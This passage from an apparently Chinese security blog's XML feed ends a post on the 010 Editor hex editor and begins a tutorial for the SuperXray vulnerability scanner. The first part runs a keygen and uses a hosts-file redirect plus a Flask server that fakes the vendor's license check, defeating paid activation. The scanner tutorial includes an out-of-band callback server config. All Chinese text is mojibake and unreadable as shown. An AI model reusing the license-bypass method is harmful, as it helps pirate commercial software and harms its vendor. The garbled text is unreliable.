builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment"># 37è¡Œ</span><span class="token keyword">def</span> <span class="token function">get_desc_list</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment"># 40è¡Œ</span>VERSION_DATE<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> date<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment"># 85è¡Œ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>è¿è¡Œ<code>python3 keygen.py</code></p><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2015.55.10.png" style="zoom:50%;"><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2015.57.05.png" style="zoom:50%;"><p>ä½†æ˜¯æ¿€æ´»å¤±è´¥ã€‚</p><p>å°è¯•æŒ‡å®šå‚æ•°ï¼š</p><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2015.57.53.png" style="zoom:40%;"><ul><li>-u æŒ‡å®šç”¨æˆ·å</li><li>-d æŒ‡å®šè¿‡æœŸæ—¶é—´</li></ul><pre class="line-numbers language-none"><code class="language-none">python3 keygen.py -u sxksec.cn -n 1 -d 2029-12-31 -t 0xac<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2015.59.28.png" style="zoom:50%;"><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.01.57.png" style="zoom:50%;"><p>è¿˜æ˜¯æ¿€æ´»å¤±è´¥ã€‚</p><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.03.03.png" style="zoom:40%;"><p>æ®µç½‘å°è¯•è¿˜æ˜¯å¤±è´¥ã€‚</p><p>çœ‹æ¥å¯èƒ½éœ€è¦è‡ªå»ºä¸€ä¸ªæœåŠ¡å™¨æ¨¡æ‹ŸéªŒè¯ä¸€ä¸‹ã€‚</p><h2 id="2-2-æ­å»ºæœåŠ¡å™¨æ¨¡æ‹ŸéªŒè¯"><a href="#2-2-æ­å»ºæœåŠ¡å™¨æ¨¡æ‹ŸéªŒè¯" class="headerlink" title="2.2 æ­å»ºæœåŠ¡å™¨æ¨¡æ‹ŸéªŒè¯"></a>2.2 æ­å»ºæœåŠ¡å™¨æ¨¡æ‹ŸéªŒè¯</h2><p>ç„¶ååœ¨hostä¸­æ·»åŠ ï¼š</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 www.sweetscape.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘ä»¬ç”¨pythonæ­å»ºä¸€ä¸ªæœ¬åœ°æœåŠ¡å™¨ï¼Œç«¯å£ä¸º80ï¼Œæ¨¡æ‹Ÿæ¿€æ´»æ—¶è½¯ä»¶è®¿é—®å®˜ç½‘éªŒè¯çš„è¿‡ç¨‹ï¼Œå¹¶è¿”å›æˆåŠŸçš„å†…å®¹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/cgibin/010editor_check_license_9b.php'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"&lt;ss&gt;valid&lt;/ss&gt;"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.10.06.png" style="zoom:50%;"><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.13.01.png" style="zoom:50%;"><h2 id="2-3-æ¿€æ´»"><a href="#2-3-æ¿€æ´»" class="headerlink" title="2.3 æ¿€æ´»"></a>2.3 æ¿€æ´»</h2><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.11.32.png" style="zoom:50%;"><p>æ¿€æ´»è¿˜æ˜¯å¤±è´¥äº†ï¼Œæ€€ç–‘æ˜¯æ²¡æœ‰å…³é—­ç³»ç»Ÿä»£ç†çš„åŸå› ã€‚</p><p>å…³æ‰clashä¹‹åé‡æ–°å°è¯•ï¼šæ¿€æ´»æˆåŠŸâœ…</p><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.12.12.png" style="zoom:50%;"><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.14.40.png" style="zoom:50%;"><p>å¯ä»¥æ„‰å¿«çš„ä½¿ç”¨äº†ã€‚</p><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.15.39.png" style="zoom:50%;"><h1 id="ä¸‰ã€ä½¿ç”¨"><a href="#ä¸‰ã€ä½¿ç”¨" class="headerlink" title="ä¸‰ã€ä½¿ç”¨"></a>ä¸‰ã€ä½¿ç”¨</h1><h2 id="3-1-åå…­è¿›åˆ¶ç¼–è¾‘"><a href="#3-1-åå…­è¿›åˆ¶ç¼–è¾‘" class="headerlink" title="3.1 åå…­è¿›åˆ¶ç¼–è¾‘"></a>3.1 åå…­è¿›åˆ¶ç¼–è¾‘</h2><p>ç›´æ¥æ‰“å¼€æƒ³ç¼–è¾‘çš„æ–‡ä»¶ã€‚</p><p>ç„¶åç‚¹å‡»èœå•æ çš„<code>Hex</code>è¿›å…¥åå…­è¿›åˆ¶ç¼–è¾‘æ¨¡å¼</p><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.29.16.png" style="zoom:60%;"><h2 id="3-2-æ’å…¥å­—èŠ‚"><a href="#3-2-æ’å…¥å­—èŠ‚" class="headerlink" title="3.2 æ’å…¥å­—èŠ‚"></a>3.2 æ’å…¥å­—èŠ‚</h2><img src="/2025/01/23/qu-zheng-he-misc-gong-ju-ku/010editor-shi-liu-jin-zhi-bian-ji-qi/%E6%88%AA%E5%B1%8F2025-01-23%2016.36.45.png" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> å–è¯å’ŒMISCå·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å–è¯å’ŒMISCå·¥å…·åº“ </tag>
            
            <tag> 010editor </tag>
            
            <tag> åå…­è¿›åˆ¶ç¼–è¾‘å™¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SuperXrayå›¾å½¢åŒ–ç•Œé¢æ¼æ´æ‰«æå·¥å…·</title>
      <link href="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/"/>
      <url>/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€SuperXrayç®€ä»‹"><a href="#ä¸€ã€SuperXrayç®€ä»‹" class="headerlink" title="ä¸€ã€SuperXrayç®€ä»‹"></a>ä¸€ã€SuperXrayç®€ä»‹</h1><p>Super Xray æ˜¯ä¸€æ¬¾åŸºäº Xray æ¼æ´æ‰«æå·¥å…·çš„ GUI å¯åŠ¨å™¨ï¼Œæ—¨åœ¨ç®€åŒ– Xray çš„ä½¿ç”¨æµç¨‹å¹¶æä¾›æ›´å‹å¥½çš„ç”¨æˆ·ç•Œé¢ã€‚Xray æœ¬èº«æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„å®‰å…¨è¯„ä¼°å·¥å…·ï¼Œæ”¯æŒä¸»åŠ¨å’Œè¢«åŠ¨æ‰«æï¼Œèƒ½å¤Ÿæ£€æµ‹å¤šç§ç±»å‹çš„æ¼æ´ã€‚ç„¶è€Œï¼ŒXray åªæœ‰å‘½ä»¤è¡Œç‰ˆæœ¬ï¼Œå¯¹äºæ–°æ‰‹æ¥è¯´å¯èƒ½ä¸å¤ªå®¹æ˜“ä¸Šæ‰‹ï¼Œå› æ­¤ Super Xray æä¾›äº†ä¸€ä¸ªå›¾å½¢åŒ–ç•Œé¢ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥æ›´å¿«é€Ÿã€æ›´ç›´è§‚åœ°è¿›è¡Œæ¼æ´æ‰«æã€‚</p><p>Super Xray åŸºäº Java 8 æ„å»ºï¼Œç¡®ä¿äº†å¹¿æ³›çš„è·¨å¹³å°å…¼å®¹æ€§ã€‚å®ƒä¸ä»…ç®€åŒ–äº† Xray çš„ä½¿ç”¨æµç¨‹ï¼Œè¿˜å¼•å…¥äº†ä¸€äº›å¢å¼ºåŠŸèƒ½ï¼Œå¦‚å†…ç½®çš„ä¸‹è½½é¢æ¿ä»¥è·å–æœ€æ–°çš„ Xray å’ŒRADå·¥å…·ã€‚æ­¤å¤–ï¼ŒSuper Xray è¿˜æ”¯æŒé€šè¿‡ <code>config.yaml</code> é…ç½®æ–‡ä»¶å¯åŠ¨ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚è¿›è¡Œçµæ´»é…ç½®ã€‚</p><p>Super Xray çš„ä½¿ç”¨å‰æåŒ…æ‹¬æœ¬åœ°æœ‰ JRE/JDK 8+ ç¯å¢ƒï¼ˆå¦‚æœä½¿ç”¨å†…ç½®JREçš„exeç‰ˆæœ¬æ— éœ€Javaç¯å¢ƒï¼‰ã€‚å®ƒæä¾›äº†ä¸¤ç§æ–¹å¼çš„exeæ–‡ä»¶ï¼Œsystemç‰ˆä½¿ç”¨ç³»ç»Ÿçš„JREï¼Œå¦ä¸€ç§å†…ç½®äº†JRE 8ã€‚Super Xray è¿˜æä¾›äº†ä¸€ä¸ªç®€å•çš„ GUI ç•Œé¢ï¼Œå¸®åŠ©ç”¨æˆ·æ›´å¿«é€Ÿåœ°ä½¿ç”¨ Xrayã€‚</p><p>æ€»çš„æ¥è¯´ï¼ŒSuper Xray æ˜¯ä¸€ä¸ªæ—¨åœ¨å¸®åŠ©æ–°æ‰‹æ›´å®¹æ˜“ä½¿ç”¨ Xray è¿›è¡Œæ¼æ´æ‰«æçš„å·¥å…·ï¼Œå®ƒé€šè¿‡å›¾å½¢åŒ–ç•Œé¢ç®€åŒ–äº†æ“ä½œæµç¨‹ï¼ŒåŒæ—¶ä¿æŒäº† Xray çš„å¼ºå¤§åŠŸèƒ½ã€‚</p><h1 id="äºŒã€å®‰è£…"><a href="#äºŒã€å®‰è£…" class="headerlink" title="äºŒã€å®‰è£…"></a>äºŒã€å®‰è£…</h1><h2 id="2-1-å‰æ"><a href="#2-1-å‰æ" class="headerlink" title="2.1 å‰æ"></a>2.1 å‰æ</h2><p>ä½¿ç”¨å‰æï¼š</p><ul><li>æœ¬åœ°æœ‰ <code>JRE/JDK 8+</code> ç¯å¢ƒï¼ˆå¦‚æœä½¿ç”¨å†…ç½®<code>JRE</code>çš„<code>exe</code>ç‰ˆæœ¬æ— éœ€<code>Java</code>ç¯å¢ƒï¼‰</li><li>ä½¿ç”¨ <code>java -jar SuperXray.jar</code> å¯åŠ¨ï¼ˆåœ¨<code>Windows</code>ä¸­åŒå‡»å¯åŠ¨ä¼šæœ‰æƒé™é—®é¢˜ï¼‰</li><li>å‰å¾€ <a href="https://stack.chaitin.com/tool/detail?id=1">ctstack</a> æˆ– <a href="https://download.xray.cool/">xray ä¸‹è½½ç«™</a> ä¸‹è½½æœ€æ–°ç‰ˆ <code>xray</code> (æœ¬å·¥å…·ä¹Ÿæœ‰å†…ç½®ä¸€é”®ä¸‹è½½é¢æ¿)</li></ul><p>æ³¨æ„ï¼š</p><ul><li>è¯·ä½¿ç”¨ 1080P åŠä»¥ä¸Šåˆ†è¾¨ç‡ï¼Œåœ¨ 720P åŠä»¥ä¸‹åˆ†è¾¨ç‡å¯èƒ½æ— æ³•å®Œå…¨æ˜¾ç¤º</li><li>è¯·ä½¿ç”¨æœ€æ–°ç‰ˆ<code>xray</code>ï¼ˆç›®å‰æ˜¯<code>1.9.4</code>ç‰ˆæœ¬ï¼Œæœ¬å·¥å…·æœªå…¼å®¹è€ç‰ˆæœ¬<code>xray</code>ï¼‰</li><li>æ”¯æŒä¸¤ç§æ–¹å¼çš„<code>exe</code>æ–‡ä»¶ï¼Œ<code>system</code>ç‰ˆä½¿ç”¨ç³»ç»Ÿçš„<code>JRE</code>ï¼Œå¦ä¸€ç§å†…ç½®äº†<code>JRE 8</code></li></ul><h2 id="2-2-ä¸‹è½½"><a href="#2-2-ä¸‹è½½" class="headerlink" title="2.2 ä¸‹è½½"></a>2.2 ä¸‹è½½</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/4ra1n/super-xray/releases/tag/1.7">https://github.com/4ra1n/super-xray/releases/tag/1.7</a></p><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2014.49.35.png" style="zoom:50%;"><p>è¿™é‡Œç›´æ¥ä¸‹è½½jaråŒ…ã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2014.51.21.png" style="zoom:50%;"><h2 id="2-3-æµ‹è¯•è¿è¡Œ"><a href="#2-3-æµ‹è¯•è¿è¡Œ" class="headerlink" title="2.3 æµ‹è¯•è¿è¡Œ"></a>2.3 æµ‹è¯•è¿è¡Œ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> super-xray-1.7.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2014.52.50.png" style="zoom:50%;"><h1 id="ä¸‰ã€ä½¿ç”¨"><a href="#ä¸‰ã€ä½¿ç”¨" class="headerlink" title="ä¸‰ã€ä½¿ç”¨"></a>ä¸‰ã€ä½¿ç”¨</h1><h2 id="3-1-é€‰æ‹©xrayçš„å¯æ‰§è¡Œæ–‡ä»¶"><a href="#3-1-é€‰æ‹©xrayçš„å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="3.1 é€‰æ‹©xrayçš„å¯æ‰§è¡Œæ–‡ä»¶"></a>3.1 é€‰æ‹©xrayçš„å¯æ‰§è¡Œæ–‡ä»¶</h2><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2014.56.03.png" style="zoom:50%;"><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2014.56.20.png" style="zoom:50%;"><h2 id="3-2-POCæ¨¡å—"><a href="#3-2-POCæ¨¡å—" class="headerlink" title="3.2 POCæ¨¡å—"></a>3.2 POCæ¨¡å—</h2><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2014.58.54.png" style="zoom:50%;"><p>ç‚¹å‡»<code>åŒæ­¥PoCæ•°æ®åº“</code>å¯ä»¥è·å–æ‰€æœ‰å¯ç”¨çš„POCã€‚</p><p>ç‚¹å‡»<code>æŸ¥çœ‹æ‰€æœ‰PoC</code>å¯ä»¥æ–¹ä¾¿åœ°æœç´¢pocå¹¶è¿è¡Œï¼š</p><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2014.57.55.png" style="zoom:50%;"><p>æœç´¢åå¤åˆ¶åˆ°è¾“å…¥æ¡†ï¼Œæ³¨æ„æ¢è¡Œåˆ†å‰²ã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2015.02.24.png" alt="æˆªå±2025-01-22 15.02.24" style="zoom:50%;"><p>é™¤æ­¤è¿™å¤–è¿˜å¯ä»¥è®¾ç½®ç­‰çº§ï¼Œé€‰æ‹©æœ¬åœ°çš„PoCï¼Œåœ¨çº¿ç”ŸæˆPoCå’Œæ¸…é™¤PoCè®¾ç½®ã€‚</p><h2 id="3-3-ä¸‹è½½é¢æ¿"><a href="#3-3-ä¸‹è½½é¢æ¿" class="headerlink" title="3.3 ä¸‹è½½é¢æ¿"></a>3.3 ä¸‹è½½é¢æ¿</h2><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2015.06.14.png" style="zoom:40%;"><p>åœ¨1.0ç‰ˆæœ¬ä»¥åæ–°å¢ä¸‹è½½é¢æ¿ï¼Œä¸€é”®ä¸‹è½½æœ€æ–°ç‰ˆ<code>xray</code>å’Œ<code>rad</code>å·¥å…·ã€‚</p><h2 id="3-4-å­åŸŸåæ‰«æ"><a href="#3-4-å­åŸŸåæ‰«æ" class="headerlink" title="3.4 å­åŸŸåæ‰«æ"></a>3.4 å­åŸŸåæ‰«æ</h2><p>åœ¨1.0ç‰ˆæœ¬ä»¥åæ”¯æŒå­åŸŸåæ‰«æï¼Œä½†æ˜¯é«˜çº§ç‰ˆæ‰å¯ä»¥ä½¿ç”¨ã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2015.07.46.png" style="zoom:50%;"><h2 id="3-5-åè¿å¹³å°"><a href="#3-5-åè¿å¹³å°" class="headerlink" title="3.5 åè¿å¹³å°"></a>3.5 åè¿å¹³å°</h2><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2015.12.36.png" style="zoom:50%;"><ol><li>é…ç½®å¥½å®¢æˆ·ç«¯çš„åè¿å¹³å°åç‚¹å‡»<code>é…ç½®æœåŠ¡ç«¯</code></li><li>ä»»æ„è¾“å…¥æ•°æ®åº“æ–‡ä»¶å</li><li>ä»»æ„è¾“å…¥tokenå¯†ç </li><li>ä¸è¦æ”¹ipå¹¶è¾“å…¥ä¸€ä¸ªç›‘å¬ç«¯å£</li><li>ç‚¹å‡»å¯¼å‡ºé…ç½®æ–‡ä»¶å¾—åˆ°ä¸€ä¸ª<code>reverse/config.yaml</code></li><li>æŠŠ<code>xray</code>å’Œè¿™ä¸ªæ–‡ä»¶å¤åˆ¶ä¸€ä»½åˆ°æœåŠ¡ç«¯</li><li>æœåŠ¡ç«¯<code>./xray reverse</code>å¯åŠ¨åè¿å¹³å°</li><li>åœ¨åè¿å¹³å°è¾“å…¥å¯¹åº”åˆ°<code>token</code>å’Œ<code>http url</code>å³å¯ï¼ˆæ³¨æ„æ˜¯ipæ ¼å¼ä¾‹å¦‚<a href="http://1.1.1.1:8080ï¼‰/">http://1.1.1.1:8080ï¼‰</a></li><li>å¼€å¯ä¸»åŠ¨æ‰«ææˆ–è¢«åŠ¨æ‰«æå³å¯</li></ol><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2015.13.21.png" style="zoom:50%;"><blockquote><h4 id="ä»€ä¹ˆæ˜¯Xrayçš„åè¿å¹³å°ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Xrayçš„åè¿å¹³å°ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Xrayçš„åè¿å¹³å°ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Xrayçš„åè¿å¹³å°ï¼Ÿ</h4><p>Xrayåè¿å¹³å°æ˜¯Xrayæ¼æ´æ‰«æå·¥å…·çš„ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½ï¼Œå®ƒä¸»è¦ç”¨äºè§£å†³åœ¨æ¼æ´æ£€æµ‹è¿‡ç¨‹ä¸­ï¼Œç”±äºç›®æ ‡ç³»ç»Ÿæ²¡æœ‰ç›´æ¥åé¦ˆï¼ˆå³æ²¡æœ‰å›æ˜¾ï¼‰ï¼Œå¯¼è‡´éš¾ä»¥ç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨çš„æƒ…å†µã€‚é€šè¿‡é…ç½®åè¿å¹³å°ï¼Œå¯ä»¥è®©ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œç‰¹å®šçš„å‘½ä»¤ï¼ˆå¦‚pingã€curlç­‰ï¼‰ï¼Œè¿™äº›å‘½ä»¤ä¼šè§¦å‘ç›®æ ‡ç³»ç»Ÿå¯¹åè¿å¹³å°å‘èµ·ç½‘ç»œè¯·æ±‚ã€‚åè¿å¹³å°æ¥æ”¶åˆ°è¿™äº›è¯·æ±‚åï¼Œå¯ä»¥ç¡®è®¤å‘½ä»¤å·²è¢«è§¦å‘ï¼Œä»è€Œé—´æ¥è¯æ˜æ¼æ´çš„å­˜åœ¨ã€‚</p><p>åè¿å¹³å°çš„é…ç½®æ¶‰åŠåˆ°å¤šä¸ªæ–¹é¢ï¼ŒåŒ…æ‹¬æ•°æ®åº“æ–‡ä»¶ä½ç½®ã€è®¤è¯Tokenã€HTTPå’ŒDNSçš„ç›‘å¬è®¾ç½®ç­‰ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é…ç½®åè¿å¹³å°çš„HTTPæœåŠ¡ï¼Œä½¿å…¶ç›‘å¬ç‰¹å®šçš„IPå’Œç«¯å£ï¼ŒåŒæ—¶æŒ‡å®šç”¨äºè·å–å®¢æˆ·ç«¯IPçš„HTTPå¤´éƒ¨ä¿¡æ¯ã€‚å¯¹äºDNSåè¿ï¼Œå¯ä»¥é…ç½®åŸŸåå’Œé™æ€è§£æè§„åˆ™ï¼Œä»¥åŠæ˜¯å¦å°†åŸŸåçš„NSè®°å½•æŒ‡å‘åè¿å¹³å°ã€‚</p><p>æ­¤å¤–ï¼Œåè¿å¹³å°è¿˜å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥å¯ç”¨æˆ–ç¦ç”¨ç‰¹å®šçš„åŠŸèƒ½ï¼Œå¦‚HTTPåè¿ã€DNSåè¿ç­‰ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œå¯èƒ½éœ€è¦æ ¹æ®ç½‘ç»œç¯å¢ƒå’Œå®‰å…¨ç­–ç•¥è¿›è¡Œç›¸åº”çš„è°ƒæ•´å’Œé…ç½®ã€‚</p><p>æ€»çš„æ¥è¯´ï¼ŒXrayåè¿å¹³å°æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå®ƒé€šè¿‡æ¥æ”¶ç›®æ ‡ç³»ç»Ÿçš„ç½‘ç»œè¯·æ±‚æ¥è¾…åŠ©ç¡®è®¤æ¼æ´çš„å­˜åœ¨ï¼Œå°¤å…¶é€‚ç”¨äºé‚£äº›æ²¡æœ‰ç›´æ¥åé¦ˆçš„æ¼æ´æ£€æµ‹åœºæ™¯ã€‚</p><h4 id="å…·ä½“å¦‚ä½•é…ç½®ï¼Ÿ"><a href="#å…·ä½“å¦‚ä½•é…ç½®ï¼Ÿ" class="headerlink" title="å…·ä½“å¦‚ä½•é…ç½®ï¼Ÿ"></a>å…·ä½“å¦‚ä½•é…ç½®ï¼Ÿ</h4><p>Xrayåè¿å¹³å°çš„é…ç½®åŒ…æ‹¬å‡ ä¸ªå…³é”®æ­¥éª¤ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><ol><li><p><strong>å‡†å¤‡é˜¶æ®µ</strong>ï¼š</p><ul><li>éœ€è¦ä¸€å°å…·æœ‰å…¬ç½‘IPçš„ä¸»æœºã€‚</li><li>è´­ä¹°ä¸€ä¸ªåŸŸåï¼Œå¹¶åˆ›å»ºä¸¤ä¸ªDNSæœåŠ¡å™¨ï¼ˆå¦‚ns1, ns2ï¼‰ã€‚</li></ul></li><li><p><strong>é…ç½®åŸŸå</strong>ï¼š</p><ul><li>ä¿®æ”¹DNSæœåŠ¡å™¨ï¼Œå¡«å†™åˆ›å»ºçš„DNSæœåŠ¡å™¨åã€‚</li><li>æ·»åŠ ä¸¤æ¡Aè®°å½•ï¼Œä¸»è®°å½•å¡«ns1å’Œns2ï¼Œè®°å½•å€¼å¡«å…¬ç½‘IPã€‚</li></ul></li><li><p><strong>XrayæœåŠ¡ç«¯é…ç½®</strong>ï¼š</p><ul><li>ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„Xrayã€‚</li><li>æ ¹æ®é…ç½®æ–‡ä»¶ç¤ºä¾‹è¿›è¡Œé…ç½®ï¼Œè®¾ç½®åè¿å¹³å°æ•°æ®åº“æ–‡ä»¶ä½ç½®ã€è®¤è¯Tokenã€HTTPå’ŒDNSçš„ç›‘å¬è®¾ç½®ç­‰ã€‚</li></ul><p>é…ç½®ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">reverse</span><span class="token punctuation">:</span>  <span class="token key atrule">db_file_path</span><span class="token punctuation">:</span> <span class="token string">"./xxx.db"</span>  <span class="token comment"># åè¿å¹³å°æ•°æ®åº“æ–‡ä»¶ä½ç½®</span>  <span class="token key atrule">token</span><span class="token punctuation">:</span> <span class="token string">"xxxxx"</span>           <span class="token comment"># åè¿å¹³å°è®¤è¯çš„ Token</span>  <span class="token key atrule">http</span><span class="token punctuation">:</span>    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">listen_ip</span><span class="token punctuation">:</span> 0.0.0.0    <span class="token key atrule">listen_port</span><span class="token punctuation">:</span> <span class="token string">"4444"</span>     <span class="token comment"># å’Œå®¢æˆ·ç«¯ä¸€è‡´</span>    <span class="token key atrule">ip_header</span><span class="token punctuation">:</span> <span class="token string">""</span>          <span class="token comment"># åœ¨å“ªä¸ª http header ä¸­å– ip</span>  <span class="token key atrule">dns</span><span class="token punctuation">:</span>    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">listen_ip</span><span class="token punctuation">:</span> 0.0.0.0    <span class="token key atrule">domain</span><span class="token punctuation">:</span> <span class="token string">"xxxx.cn"</span>       <span class="token comment"># è‡ªå·±è´­ä¹°åŸŸå</span>    <span class="token key atrule">is_domain_name_server</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token key atrule">resolve</span><span class="token punctuation">:</span>                <span class="token comment"># DNS é™æ€è§£æè§„åˆ™</span>    <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> A      <span class="token key atrule">record</span><span class="token punctuation">:</span> ns2      <span class="token key atrule">value</span><span class="token punctuation">:</span> xx.xx.xx.xx    <span class="token comment"># è‡ªå·±å…¬ç½‘ä¸»æœºip</span>      <span class="token key atrule">ttl</span><span class="token punctuation">:</span> <span class="token number">60</span>    <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> A      <span class="token key atrule">record</span><span class="token punctuation">:</span> ns1      <span class="token key atrule">value</span><span class="token punctuation">:</span> xx.xx.xx.xx    <span class="token comment"># è‡ªå·±å…¬ç½‘ä¸»æœºip</span>      <span class="token key 